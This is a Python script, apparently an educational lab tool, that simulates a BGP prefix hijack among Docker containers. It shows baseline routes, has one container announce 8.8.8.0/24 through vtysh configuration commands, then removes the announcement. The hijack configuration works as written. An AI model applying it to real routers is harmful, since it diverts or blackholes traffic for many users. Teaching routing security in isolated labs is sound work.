#!/usr/bin/env python3
import subprocess
import time
from datetime import datetime

class WorkingBGPAttackSimulator:
    def __init__(self):
        print("🔒 NetSecSim BGP Attack Simulator")
        print("=" * 50)
        print("⚠️  EDUCATIONAL SIMULATION ONLY")
        print("   • Completely isolated in Docker containers")
        print("   • No real networks affected")
        print("   • Safe for learning and research")
        print("=" * 50)
        
    def log(self, message, level="INFO"):
        colors = {
            'INFO': '\033[94m',    # Blue
            'ATTACK': '\033[91m',  # Red
            'SUCCESS': '\033[92m', # Green
            'WARNING': '\033[93m'  # Yellow
        }
        color = colors.get(level, '\033[0m')
        reset = '\033[0m'
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{color}[{timestamp}] {message}{reset}")
    
    def check_containers(self):
        """Check if all containers are running"""
        try:
            result = subprocess.run(['docker', 'ps', '--format', '{{.Names}}'], 
                                  capture_output=True, text=True)
            containers = result.stdout.strip().split('\n')
            
            required = ['as100', 'as200', 'as300', 'as400', 'as500']
            missing = [c for c in required if c not in containers]
            
            if missing:
                self.log(f"Missing containers: {missing}", "WARNING")
                self.log("Run: ./fixed-setup.sh", "WARNING")
                return False
            
            self.log("✓ All containers running", "SUCCESS")
            return True
            
        except Exception as e:
            self.log(f"Container check failed: {e}", "WARNING")
            return False
    
    def show_bgp_status(self):
        """Show BGP session status"""
        if not self.check_containers():
            return
            
        self.log("🔍 Checking BGP Status", "INFO")
        print("\nBGP Session Status:")
        print("-" * 40)
        
        for as_name in ['as100', 'as200', 'as300', 'as400', 'as500']:
            try:
                result = subprocess.run(
                    ['docker', 'exec', '-t', as_name, 'vtysh', '-c', 'show ip bgp summary'],
                    capture_output=True, text=True, timeout=10
                )
                
                if result.returncode == 0:
                    # Count established sessions
                    established = result.stdout.count('Established')
                    total_lines = len([l for l in result.stdout.split('\n') if '172.20.0.' in l])
                    
                    if established > 0:
                        print(f"✅ {as_name}: {established}/{total_lines} BGP sessions established")
                    else:
                        print(f"⏳ {as_name}: BGP sessions connecting...")
                else:
                    print(f"❌ {as_name}: BGP not responding")
                    
            except Exception as e:
                print(f"❌ {as_name}: Connection failed")
        
        print("\nRoute Learning Status:")
        print("-" * 40)
        
        # Check route learning
        for as_name in ['as100', 'as200', 'as300', 'as400', 'as500']:
            try:
                result = subprocess.run(
                    ['docker', 'exec', '-t', as_name, 'vtysh', '-c', 'show ip bgp'],
                    capture_output=True, text=True, timeout=10
                )
                
                if result.returncode == 0:
                    routes = [l for l in result.stdout.split('\n') if l.strip().startswith('*>')]
                    print(f"📋 {as_name}: Learning {len(routes)} routes")
                    
                    # Show sample routes
                    for route in routes[:3]:
                        parts = route.split()
                        if len(parts) >= 2:
                            network = parts[1]
                            print(f"    • {network}")
                            
            except Exception:
                continue
    
    def show_routing_table(self, as_name, prefix=None):
        """Show routing table for specific AS"""
        try:
            cmd = 'show ip bgp'
            if prefix:
                cmd += f' {prefix}'
                
            result = subprocess.run(
                ['docker', 'exec', '-t', as_name, 'vtysh', '-c', cmd],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                print(f"\n{as_name.upper()} Routing Table:")
                print("-" * 30)
                print(result.stdout)
            else:
                print(f"❌ Could not get routing table from {as_name}")
                
        except Exception as e:
            print(f"❌ Error: {e}")
    
    def prefix_hijack_attack(self):
        """Simulate prefix hijacking attack"""
        if not self.check_containers():
            return
            
        self.log("🚨 STARTING PREFIX HIJACK SIMULATION", "ATTACK")
        self.log("Scenario: AS500 hijacks Google DNS (8.8.8.0/24) from AS300", "ATTACK")
        self.log("This is a SIMULATION - no real networks affected!", "WARNING")
        
        print("\n" + "="*60)
        print("EDUCATIONAL BGP ATTACK SIMULATION")
        print("="*60)
        
        # Show baseline
        self.log("📊 Step 1: Showing baseline routing", "INFO")
        print("\nBASELINE: How AS200 reaches 8.8.8.0/24 (Google DNS)")
        self.show_routing_table('as200', '8.8.8.0/24')
        
        input("\nPress Enter to inject the attack...")
        
        # Inject hijacked route
        self.log("💉 Step 2: AS500 injecting hijacked route", "ATTACK")
        
        try:
            # Configure hijacked route on AS500
            config_script = """
configure terminal
ip route 8.8.8.0/24 null0
router bgp 65500
network 8.8.8.0/24
end
write memory
"""
            
            process = subprocess.Popen(
                ['docker', 'exec', '-i', 'as500', 'vtysh'],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, text=True
            )
            
            stdout, stderr = process.communicate(input=config_script, timeout=20)
            
            if process.returncode == 0:
                self.log("✅ Hijacked route injected on AS500", "SUCCESS")
            else:
                self.log(f"❌ Route injection failed: {stderr}", "WARNING")
                return
                
        except Exception as e:
            self.log(f"❌ Configuration failed: {e}", "WARNING")
            return
        
        # Force BGP updates
        self.log("🔄 Step 3: Propagating attack through BGP", "INFO")
        
        for as_name in ['as300', 'as500']:
            subprocess.run(['docker', 'exec', '-i', as_name, 'vtysh', '-c', 'clear ip bgp * soft'])
        
        # Monitor attack propagation
        self.log("📈 Step 4: Monitoring attack propagation", "INFO")
        
        for i in range(6):  # 30 seconds total
            time.sleep(5)
            print(f"  ⏱️  Monitoring... {(i+1)*5}/30 seconds")
            
        # Show attack results
        self.log("🎯 Step 5: Showing attack results", "ATTACK")
        print("\nATTACK RESULTS: How AS200 now reaches 8.8.8.0/24")
        self.show_routing_table('as200', '8.8.8.0/24')
        
        print("\nATTACK ANALYSIS:")
        print("• If AS200 learned route via AS500, the hijack succeeded!")
        print("• Traffic to Google DNS would now go to the attacker")
        print("• This demonstrates how BGP lacks authentication")
        
        input("\nPress Enter to clean up the attack...")
        
        # Cleanup
        self.log("🧹 Step 6: Cleaning up attack", "INFO")
        
        cleanup_script = """
configure terminal
no ip route 8.8.8.0/24 null0
router bgp 65500
no network 8.8.8.0/24
end
"""
        
        try:
            process = subprocess.Popen(
                ['docker', 'exec', '-i', 'as500', 'vtysh'],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, text=True
            )
            
            process.communicate(input=cleanup_script, timeout=20)
            
            # Clear BGP sessions
            for as_name in ['as300', 'as500']:
                subprocess.run(['docker', 'exec', '-i', as_name, 'vtysh', '-c', 'clear ip bgp * soft'])
            
            self.log("✅ Attack cleaned up", "SUCCESS")
            
        except Exception as e:
            self.log(f"⚠️  Cleanup warning: {e}", "WARNING")
        
        time.sleep(10)
        
        # Show final state
        self.log("📊 Step 7: Verifying cleanup", "INFO")
        print("\nPOST-CLEANUP: Routes should be back to normal")
        self.show_routing_table('as200', '8.8.8.0/24')
        
        self.log("🏁 PREFIX HIJACK SIMULATION COMPLETE", "SUCCESS")
        print("\n" + "="*60)
        print("SIMULATION SUMMARY:")
        print("• Demonstrated how BGP prefix hijacking works")
        print("• Showed attack propagation through AS relationships") 
        print("• Illustrated why BGP security is important")
        print("• All changes contained in Docker - no real impact")
        print("="*60)

def main():
    simulator = WorkingBGPAttackSimulator()
    
    while True:
        print("\n🎯 NetSecSim BGP Attack Simulator")
        print("Options:")
        print("1. Check BGP Status")
        print("2. Show Routing Tables") 
        print("3. Run Prefix Hijack Simulation")
        print("4. Container Health Check")
        print("0. Exit")
        
        try:
            choice = input("\nSelect (0-4): ").strip()
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
            break
        
        if choice == '0':
            break
        elif choice == '1':
            simulator.show_bgp_status()
        elif choice == '2':
            as_name = input("Enter AS name (as100/as200/as300/as400/as500): ").strip()
            if as_name in ['as100', 'as200', 'as300', 'as400', 'as500']:
                simulator.show_routing_table(as_name)
            else:
                print("Invalid AS name!")
        elif choice == '3':
            simulator.prefix_hijack_attack()
        elif choice == '4':
            simulator.check_containers()
        else:
            print("❌ Invalid choice!")
    
    print("👋 Thanks for using NetSecSim!")

if __name__ == "__main__":
    main()
